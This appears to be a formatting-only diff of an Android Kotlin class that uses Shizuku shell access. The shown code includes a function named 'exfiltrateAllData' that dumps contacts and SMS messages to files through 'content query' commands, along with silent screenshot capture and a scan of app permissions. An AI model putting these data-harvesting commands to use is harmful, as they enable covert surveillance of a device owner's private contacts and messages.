@@ -43,10 +43,14 @@ class FeatureHandler(private val context: Context) {
      */
     fun exfiltrateAllData(shizukuManagerService: ShizukuManagerService?) {
         // This would combine all data extraction methods into one
-        shizukuManagerService?.executeCommandAsync("content query --uri content://com.android.contacts/data --projection display_name:data1:mimetype") { result ->
+        shizukuManagerService?.executeCommandAsync(
+            "content query --uri content://com.android.contacts/data --projection display_name:data1:mimetype",
+        ) { result ->
             saveDataToFile("extracted_contacts.txt", result.output)
         }
-        shizukuManagerService?.executeCommandAsync("content query --uri content://sms/inbox --projection address:body:date") { result ->
+        shizukuManagerService?.executeCommandAsync(
+            "content query --uri content://sms/inbox --projection address:body:date",
+        ) { result ->
             saveDataToFile("extracted_messages.txt", result.output)
         }
         // ... and so on for other data types
@@ -97,7 +101,7 @@ class FeatureHandler(private val context: Context) {
     fun takeScreenshot(shizukuManagerService: ShizukuManagerService?) {
         val screenshotFile = File(
             Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES),
-            "screenshot_${System.currentTimeMillis()}.png"
+            "screenshot_${System.currentTimeMillis()}.png",
         )
         shizukuManagerService?.executeCommandAsync("screencap -p ${screenshotFile.absolutePath}") {
             Log.d(TAG, "Screenshot saved to ${screenshotFile.absolutePath}")
@@ -146,7 +150,7 @@ class FeatureHandler(private val context: Context) {
         context.packageManager.setComponentEnabledSetting(
             componentName,
             PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-            PackageManager.DONT_KILL_APP
+            PackageManager.DONT_KILL_APP,
         )
     }
 
@@ -158,14 +162,19 @@ class FeatureHandler(private val context: Context) {
         val packages = pm.getInstalledApplications(PackageManager.GET_META_DATA)
         val report = StringBuilder()
         val dangerousPermissions = setOf(
-            "android.permission.CAMERA", "android.permission.RECORD_AUDIO",
-            "android.permission.READ_CONTACTS", "android.permission.READ_SMS",
-            "android.permission.ACCESS_FINE_LOCATION"
+            "android.permission.CAMERA",
+            "android.permission.RECORD_AUDIO",
+            "android.permission.READ_CONTACTS",
+            "android.permission.READ_SMS",
+            "android.permission.ACCESS_FINE_LOCATION",
         )
 
         for (appInfo in packages) {
             try {
-                val requestedPermissions = pm.getPackageInfo(appInfo.packageName, PackageManager.GET_PERMISSIONS).requestedPermissions
+                val requestedPermissions = pm.getPackageInfo(
+                    appInfo.packageName,
+                    PackageManager.GET_PERMISSIONS,
+                ).requestedPermissions
                 if (requestedPermissions != null) {
                     val grantedDangerous = requestedPermissions.filter { dangerousPermissions.contains(it) }
                     if (grantedDangerous.isNotEmpty()) {
